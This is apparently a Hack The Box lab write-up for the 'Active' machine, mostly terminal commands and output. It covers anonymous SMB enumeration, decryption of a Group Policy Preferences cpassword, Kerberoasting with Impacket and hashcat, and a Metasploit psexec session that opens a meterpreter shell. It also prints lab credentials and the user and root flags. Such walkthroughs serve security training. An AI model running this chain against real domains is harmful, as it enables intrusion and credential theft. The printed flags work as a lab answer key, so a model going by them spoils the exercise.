Active | 10.10.10.100 | Hackthebox

nmap scan
---------
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-20 04:52:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49182/tcp open  msrpc         Microsoft Windows RPC

since the port 88, 445 and 389 are open we can confirm that we are up against a domain comtroller , Active directory machine

trying the smbclient to enumerate with anonymous login
──(root💀kali)-[~/Downloads/HTB/Active]
└─# smbclient -L 10.10.10.100
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available

the share we can access is the Replicatiosn directory
┌──(root💀kali)-[~/Downloads/HTB/Active]
└─# smbclient //10.10.10.100/Replication                                                                                                                                 1 ⨯
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

		10459647 blocks of size 4096. 5727921 blocks available
smb: \> cd active.htb
smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 06:37:44 2018
  Policies                            D        0  Sat Jul 21 06:37:44 2018
  scripts                             D        0  Wed Jul 18 14:48:57 2018

		10459647 blocks of size 4096. 5727921 blocks available
smb: \active.htb\> cd policies
smb: \active.htb\policies\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 06:37:44 2018
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 06:37:44 2018

		10459647 blocks of size 4096. 5727921 blocks available
smb: \active.htb\policies\> cd {31B2F340-016D-11D2-945F-00C04FB984F9}
smb: \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPT.INI                             A       23  Wed Jul 18 16:46:06 2018
  Group Policy                        D        0  Sat Jul 21 06:37:44 2018
  MACHINE                             D        0  Sat Jul 21 06:37:44 2018
  USER                                D        0  Wed Jul 18 14:49:12 2018

		10459647 blocks of size 4096. 5727921 blocks available
smb: \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd machine
smb: \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Microsoft                           D        0  Sat Jul 21 06:37:44 2018
  Preferences                         D        0  Sat Jul 21 06:37:44 2018
  Registry.pol                        A     2788  Wed Jul 18 14:53:45 2018

		10459647 blocks of size 4096. 5727921 blocks available
smb: \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\> cd preference
cd \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\preference\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\> ;s
;s: command not found
smb: \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\> cd Preferences
smb: \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\Preferences\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups                              D        0  Sat Jul 21 06:37:44 2018

		10459647 blocks of size 4096. 5727921 blocks available
smb: \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\Preferences\> cd Groups
smb: \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

		10459647 blocks of size 4096. 5727921 blocks available



name="active.htb\SVC_TGS"
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
SVC_TGS : GPPstillStandingStrong2k18

┌──(root💀kali)-[~/Downloads/HTB/Active]
└─# GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/SVC_TGS
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 14:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 16:14:38.402764  2021-07-20 04:57:56.527429 


smbclient //10.10.10.100/Users -u SVC_TGS
cd to SVC_TGS for user.txt

kerbroasting 
------------
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
grab the hash, save it in a text file, crack it with hashcat
Ticketmaster1968

metasploit 
----------
use windows/smb/psexec
set the values 
user administrator 
pass Ticketmaster1968
rhosts, lhosts, share, ADMIN$
and we have a meterpreter shell 

user.txt : 86d67d8ba232bb6a254aa4d10159e983 
root.txt : b5fc76d1d6b91d77b2fbf2d54d0f708b
